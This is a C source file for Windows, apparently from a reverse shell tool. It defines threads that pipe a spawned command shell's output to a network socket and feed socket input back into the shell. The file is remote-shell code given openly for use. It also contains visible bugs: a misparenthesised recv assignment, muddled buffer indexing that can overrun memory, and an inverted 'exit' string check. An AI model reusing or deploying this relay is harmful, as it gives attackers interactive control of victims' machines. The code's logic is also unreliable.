// Includes
#include <windows.h>
#include <winbase.h>
#include <stdio.h>

#include "pipe_threads.h"
#include "reverse_shell.h"

/*
    STDOUT Thread function

    Pipe->Socket

    Reads from the pipe of the shell and writes to the socket.
*/
void stdoutThread(LPVOID _shell)
{
    PSHELL shell = (PSHELL)_shell;
    BOOL exit = 0;
    BYTE socketbuf[BUFFER_SIZE_OUT];
    DWORD read, sent;

    while(PeekNamedPipe(shell->hStdoutPipe, socketbuf, sizeof(socketbuf), &read, NULL, NULL) && !exit)
    {
        if(read > 0)
        {
            if(ReadFile(shell->hStdoutPipe, socketbuf, read, NULL, NULL))
            {
                // Send pipebuf to socketbuf

                if((sent = send(shell->socket, (const char*)socketbuf, read, 0)) <= 0)
                {
                    exit = 1;

                    fprintf(stdout, "[-] Send failed\n");
                    fprintf(stdout, "Info: Sent = %ld\n", sent);
                    fprintf(stdout, "Info: Read = %ld\n", read);
                }
            }
            else
            {
                exit = 1;

                fprintf(stdout, "[-] ReadFile - STDOUTPIPE failed!\n");
            }
        }
    }

    fprintf(stdout, "[+] Exited STDOUT (Pipe->Socket) Thread\n");

    ExitThread(0);
}

/*
    STDIN Thread function

    Socket->Pipe

    Reads from the socket and writes to the stdin pipe of the shell.
*/
void stdinThread(LPVOID _shell)
{
    PSHELL shell = (PSHELL)_shell;
    BOOL exit = 0;
    BYTE socketbuf[BUFFER_SIZE_IN * 2];
    BYTE pipebuf[BUFFER_SIZE_IN];
    DWORD read, write, bufctr;
    BYTE prevChar = 0;

    while((read = recv(shell->socket, (char*)socketbuf, sizeof(pipebuf), 0) > 0) && !exit)
    {
        for(bufctr = 0, write = 0; bufctr < read; bufctr++, write++)
        {
            if(socketbuf[bufctr] == '\n' && prevChar != '\r') pipebuf[bufctr++] = '\r';

            prevChar = pipebuf[write++];

            if(bufctr < read) pipebuf[write] = socketbuf[bufctr];
        }

        if(!WriteFile(shell->hStdinPipe, pipebuf, write, NULL, NULL))
        {
            exit = 1;

            fprintf(stdout, "[-] WriteFile - STDINPIPE failed!\n");
        }
        else
        {
            if(_strnicmp((const char*)pipebuf, "exit\r\n", 6))
            {
                exit = 1;

                fprintf(stdout, "[+] Received 'exit' command, exiting...");
            }
        }
    }

    fprintf(stdout, "[+] Exited STDIN (Socket->Pipe) Thread\n");

    ExitThread(0);
}
